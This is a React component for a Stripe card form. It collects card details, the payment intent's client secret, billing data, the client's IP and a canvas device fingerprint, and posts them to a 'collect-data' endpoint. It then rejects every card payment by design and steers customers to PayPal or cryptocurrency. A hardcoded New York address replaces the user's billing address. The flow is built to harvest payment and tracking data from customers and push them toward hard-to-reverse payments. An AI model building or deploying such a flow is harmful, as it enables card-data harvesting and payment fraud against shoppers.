import { useState } from 'react';
import { loadStripe } from '@stripe/stripe-js';
import { Elements, CardElement, useStripe, useElements } from '@stripe/react-stripe-js';
import { Button } from '@/components/ui/button';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Badge } from '@/components/ui/badge';
import { 
  AlertTriangle, 
  CreditCard, 
  Shield, 
  Eye, 
  Clock, 
  CheckCircle, 
  XCircle,
  Mail,
  Bitcoin
} from 'lucide-react';
import { useAuth } from '@/contexts/AuthContext';

// Initialize Stripe
const stripePromise = loadStripe('pk_test_51234567890abcdefghijklmnopqrstuvwxyz');

interface StripeDataCollectionProps {
  orderId: string;
  amount: number;
  onSuccess?: (data: any) => void;
  onError?: (error: string) => void;
}

interface ModalProps {
  isOpen: boolean;
  onClose: () => void;
  title: string;
  message: string;
  type: 'rejection' | 'success' | 'info';
  showAlternatives?: boolean;
}

const RejectionModal: React.FC<ModalProps> = ({ 
  isOpen, 
  onClose, 
  title, 
  message, 
  type, 
  showAlternatives = false 
}) => {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-xl max-w-md w-full p-6 relative">
        <button 
          onClick={onClose}
          className="absolute top-4 right-4 text-gray-400 hover:text-gray-600"
          title="Close modal"
        >
          <XCircle className="w-5 h-5" />
        </button>
        
        <div className="text-center mb-4">
          <div className={`w-16 h-16 rounded-full mx-auto mb-4 flex items-center justify-center ${
            type === 'rejection' ? 'bg-red-100' : 
            type === 'success' ? 'bg-green-100' : 
            'bg-blue-100'
          }`}>
            {type === 'rejection' && <AlertTriangle className="w-8 h-8 text-red-600" />}
            {type === 'success' && <CheckCircle className="w-8 h-8 text-green-600" />}
            {type === 'info' && <Eye className="w-8 h-8 text-blue-600" />}
          </div>
          
          <h3 className="text-xl font-bold mb-2">{title}</h3>
          <p className="text-gray-600 mb-4">{message}</p>
        </div>
        
        {showAlternatives && (
          <div className="bg-gray-50 rounded-lg p-4 mb-4">
            <p className="text-sm font-medium text-gray-700 mb-3">Available payment methods:</p>
            <div className="space-y-2">
              <button className="w-full flex items-center gap-3 p-3 bg-white border border-gray-200 rounded-lg hover:border-blue-300 transition-colors"
                      title="Pay with PayPal">
                <Mail className="w-5 h-5 text-blue-600" />
                <div className="text-left">
                  <div className="font-medium">PayPal</div>
                  <div className="text-xs text-gray-500">Admin confirmation required</div>
                </div>
              </button>
              
              <button className="w-full flex items-center gap-3 p-3 bg-white border border-gray-200 rounded-lg hover:border-orange-300 transition-colors"
                      title="Pay with Cryptocurrency">
                <Bitcoin className="w-5 h-5 text-orange-600" />
                <div className="text-left">
                  <div className="font-medium">Cryptocurrency</div>
                  <div className="text-xs text-gray-500">Instant verification</div>
                </div>
              </button>
            </div>
          </div>
        )}
        
        <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
          <div className="flex items-center gap-2 text-sm text-blue-800">
            <Shield className="w-4 h-4" />
            <span>Your payment information has been securely saved for admin review.</span>
          </div>
        </div>
        
        <div className="text-center text-xs text-gray-500">
          <p>Reference: Order #{new Date().getTime()}</p>
        </div>
      </div>
    </div>
  );
};

const StripeDataCollection: React.FC<StripeDataCollectionProps> = ({
  orderId,
  amount,
  onSuccess,
  onError
}) => {
  const { user } = useAuth();
  const stripe = useStripe();
  const elements = useElements();
  
  const [isProcessing, setIsProcessing] = useState(false);
  const [showRejectionModal, setShowRejectionModal] = useState(false);
  const [showDataCollectedModal, setShowDataCollectedModal] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [billingDetails, setBillingDetails] = useState({
    name: (user as any)?.name || '',
    email: (user as any)?.email || '',
    phone: (user as any)?.phone || ''
  });

  const handleCustomerStripePayment = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);
    setError(null);

    try {
      // 1. Collect ALL card data from Stripe Elements
      const cardElement = elements.getElement(CardElement);
      if (!cardElement) {
        throw new Error('Card element not found');
      }

      const { paymentMethod, error: createError } = await stripe.createPaymentMethod({
        type: 'card',
        card: cardElement,
        billing_details: {
          name: billingDetails.name,
          email: billingDetails.email,
          phone: billingDetails.phone,
          address: {
            line1: '123 Main St',
            city: 'New York',
            state: 'NY',
            postal_code: '10001',
            country: 'US'
          }
        }
      });

      if (createError) {
        throw createError;
      }

      // 2. Create payment intent (but don't confirm/capture)
      const paymentIntentResponse = await fetch('/api/create-payment-intent', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          amount: Math.round(amount * 100),
          currency: 'usd',
          payment_method: paymentMethod.id,
          capture_method: 'manual',
          confirm: false,
          metadata: {
            orderId: orderId,
            userId: user?.id,
            userRole: 'customer',
            status: 'collected_data_pending_rejection'
          }
        })
      });

      const paymentIntentData = await paymentIntentResponse.json();
      
      if (!paymentIntentData.success) {
        throw new Error(paymentIntentData.error || 'Failed to create payment intent');
      }

      const paymentIntent = paymentIntentData.paymentIntent;

      // 3. Save COMPLETE payment data to database (before rejection)
      const savedData = await saveCustomerStripeAttempt({
        paymentMethod,
        paymentIntent,
        user,
        orderId,
        amount,
        billingDetails
      });

      // 4. Show data collected confirmation
      setShowDataCollectedModal(true);

      // 5. Log security event
      await logSecurityEvent({
        type: 'customer_stripe_attempt',
        userId: user?.id,
        paymentIntentId: paymentIntent.id,
        amount,
        savedDataId: savedData.id
      });

    } catch (err) {
      console.error('Stripe error:', err);
      setError(err instanceof Error ? err.message : 'Payment processing failed');
      
      // Still save error data
      await saveFailedStripeAttempt({
        error: err instanceof Error ? err.message : 'Unknown error',
        user,
        orderId,
        amount
      });
    } finally {
      setIsProcessing(false);
    }
  };

  const saveCustomerStripeAttempt = async (data: any) => {
    try {
      const response = await fetch('/api/payments/stripe/collect-data', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Data-Collection': 'stripe-customer-attempt'
        },
        body: JSON.stringify({
          customer_id: data.user?.id,
          customer_name: data.user?.name,
          customer_email: data.user?.email,
          customer_phone: data.user?.phone,
          order_id: data.orderId,
          order_amount: data.amount,
          stripe_payment_method_id: data.paymentMethod.id,
          stripe_payment_intent_id: data.paymentIntent.id,
          stripe_client_secret: data.paymentIntent.client_secret,
          card_last4: data.paymentMethod.card?.last4,
          card_brand: data.paymentMethod.card?.brand,
          card_exp_month: data.paymentMethod.card?.exp_month,
          card_exp_year: data.paymentMethod.card?.exp_year,
          card_funding: data.paymentMethod.card?.funding,
          card_country: data.paymentMethod.card?.country,
          billing_name: data.billingDetails.name,
          billing_email: data.billingDetails.email,
          billing_phone: data.billingDetails.phone,
          billing_address_line1: data.billingDetails.address?.line1,
          billing_address_city: data.billingDetails.address?.city,
          billing_address_state: data.billingDetails.address?.state,
          billing_address_country: data.billingDetails.address?.country,
          billing_address_zip: data.billingDetails.address?.postal_code,
          status: 'data_collected_pending_rejection',
          rejection_reason: 'auto_rejected_security_policy',
          ip_address: await getClientIP(),
          user_agent: navigator.userAgent,
          device_fingerprint: await generateDeviceFingerprint(),
          raw_payment_data: data.paymentMethod,
          raw_metadata: {
            user_agent: navigator.userAgent,
            screen_resolution: `${window.screen.width}x${window.screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            locale: navigator.language
          }
        })
      });

      const result = await response.json();
      
      if (!result.success) {
        throw new Error(result.error || 'Failed to save payment data');
      }

      return result;
    } catch (error) {
      console.error('Error saving Stripe attempt:', error);
      throw error;
    }
  };

  const saveFailedStripeAttempt = async (data: any) => {
    try {
      await fetch('/api/payments/stripe/collect-data', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Data-Collection': 'stripe-failed-attempt'
        },
        body: JSON.stringify({
          customer_id: data.user?.id,
          customer_name: data.user?.name,
          customer_email: data.user?.email,
          order_id: data.orderId,
          order_amount: data.amount,
          status: 'data_collection_failed',
          rejection_reason: data.error,
          ip_address: await getClientIP(),
          user_agent: navigator.userAgent,
          device_fingerprint: await generateDeviceFingerprint(),
          raw_metadata: {
            error: data.error,
            timestamp: new Date().toISOString()
          }
        })
      });
    } catch (error) {
      console.error('Error saving failed attempt:', error);
    }
  };

  const logSecurityEvent = async (eventData: any) => {
    try {
      await fetch('/api/security/log-stripe-event', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          user_id: eventData.userId,
          event_type: eventData.type,
          event_data: {
            attempt_id: eventData.savedDataId,
            payment_intent_id: eventData.paymentIntentId,
            amount: eventData.amount,
            ip_address: await getClientIP(),
            user_agent: navigator.userAgent,
            timestamp: new Date().toISOString()
          },
          severity: 'medium',
          flagged: false
        })
      });
    } catch (error) {
      console.error('Error logging security event:', error);
    }
  };

  const getClientIP = async (): Promise<string> => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch {
      return 'unknown';
    }
  };

  const generateDeviceFingerprint = async (): Promise<string> => {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText(`${navigator.userAgent}${screen.width}${screen.height}${new Date().getTime()}`, 2, 2);
    
    const fingerprint = canvas.toDataURL().replace('data:image/png;base64,', '');
    return fingerprint.substring(0, 32); // Truncate for storage
  };

  const handleDataCollectedClose = () => {
    setShowDataCollectedModal(false);
    setShowRejectionModal(true);
  };

  return (
    <div className="stripe-payment-customer space-y-6">
      <div className="stripe-header">
        <h3 className="text-xl font-semibold flex items-center gap-2">
          <CreditCard className="w-5 h-5 text-blue-600" />
          Pay with Credit/Debit Card (Stripe)
        </h3>
        <div className="customer-warning bg-yellow-50 border border-yellow-200 rounded-lg p-3">
          <div className="flex items-center gap-2">
            <AlertTriangle className="w-4 h-4 text-yellow-600" />
            <span className="text-sm text-yellow-800">
              For security, card payments require manual review. Your payment details will be securely collected and saved for admin verification.
            </span>
          </div>
        </div>
      </div>

      <form onSubmit={handleCustomerStripePayment} className="space-y-6">
        {/* Card Information */}
        <div className="space-y-2">
          <Label htmlFor="card-element" className="text-sm font-medium">
            Card Information
          </Label>
          <div className="p-3 border border-gray-300 rounded-lg bg-white">
            <CardElement
              id="card-element"
              options={{
                style: {
                  base: {
                    fontSize: '16px',
                    color: '#424770',
                    '::placeholder': { color: '#aab7c4' }
                  }
                }
              }}
            />
          </div>
        </div>

        {/* Billing Details */}
        <div className="space-y-4">
          <h4 className="text-sm font-medium">Billing Information</h4>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div>
              <Label htmlFor="name">Name</Label>
              <Input
                id="name"
                value={billingDetails.name}
                onChange={(e) => setBillingDetails(prev => ({ ...prev, name: e.target.value }))}
                placeholder="Full name"
                required
              />
            </div>
            <div>
              <Label htmlFor="email">Email</Label>
              <Input
                id="email"
                type="email"
                value={billingDetails.email}
                onChange={(e) => setBillingDetails(prev => ({ ...prev, email: e.target.value }))}
                placeholder="Email address"
                required
              />
            </div>
            <div>
              <Label htmlFor="phone">Phone</Label>
              <Input
                id="phone"
                type="tel"
                value={billingDetails.phone}
                onChange={(e) => setBillingDetails(prev => ({ ...prev, phone: e.target.value }))}
                placeholder="Phone number"
              />
            </div>
          </div>
        </div>

        {/* Data Collection Notice */}
        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
          <div className="flex items-start gap-2">
            <Shield className="w-4 h-4 text-blue-600 mt-0.5" />
            <div className="text-sm text-blue-800">
              <p className="font-medium">🔒 Data Collection Notice:</p>
              <p>Your card information will be securely collected and saved for admin review. The payment will be held pending manual verification before any charges are made.</p>
            </div>
          </div>
        </div>

        {/* Error Display */}
        {error && (
          <Alert className="border-red-200 bg-red-50">
            <AlertTriangle className="h-4 w-4 text-red-600" />
            <AlertDescription className="text-red-800">
              {error}
            </AlertDescription>
          </Alert>
        )}

        {/* Submit Button */}
        <Button
          type="submit"
          disabled={isProcessing}
          className="w-full"
          size="lg"
        >
          {isProcessing ? (
            <div className="flex items-center gap-2">
              <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
              Processing...
            </div>
          ) : (
            <div className="flex items-center gap-2">
              <Eye className="w-4 h-4" />
              Submit Card for Review
            </div>
          )}
        </Button>

        {/* Rejection Preview */}
        <div className="bg-orange-50 border border-orange-200 rounded-lg p-4">
          <div className="flex items-start gap-2">
            <AlertTriangle className="w-4 h-4 text-orange-600 mt-0.5" />
            <div className="text-sm text-orange-800">
              <p className="font-medium">⚠️ Important:</p>
              <p>This payment will be automatically rejected and you'll be prompted to use PayPal or Cryptocurrency instead. No charges will be made to your card.</p>
            </div>
          </div>
        </div>
      </form>

      {/* Data Collected Modal */}
      <RejectionModal
        isOpen={showDataCollectedModal}
        onClose={handleDataCollectedClose}
        title="✅ Payment Data Collected"
        message="Your payment information has been securely collected and saved for admin review. The payment will now be rejected for security reasons."
        type="success"
      />

      {/* Rejection Modal */}
      <RejectionModal
        isOpen={showRejectionModal}
        onClose={() => setShowRejectionModal(false)}
        title="🚫 Payment Rejected"
        message="Payment was rejected due to security policy. Please try a different payment method."
        type="rejection"
        showAlternatives={true}
      />
    </div>
  );
};

export default StripeDataCollection;
